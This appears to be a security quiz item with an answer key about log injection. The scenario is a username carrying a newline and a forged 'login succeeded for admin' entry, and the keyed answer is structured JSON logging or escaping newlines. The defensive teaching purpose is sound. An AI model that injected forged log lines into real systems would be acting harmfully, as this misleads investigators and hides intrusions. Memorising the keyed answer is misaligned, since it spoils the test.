questions.question: A plain-text log line is written as `logger.info("login failed for " + username)`. An attacker submits a username containing a newline followed by `INFO login succeeded for admin`. What happens, and what helps?
choices: The logger crashes on the newline character
The attacker is logged in as admin
Nothing, because log files ignore newlines
The attacker forges a fake log entry; structured JSON logging or escaping newlines prevents it
questions.explanation: The newline ends the real entry, and the rest appears as a separate, forged log line that can mislead investigators. Structured logging (JSON, values as fields) or escaping newlines prevents it.
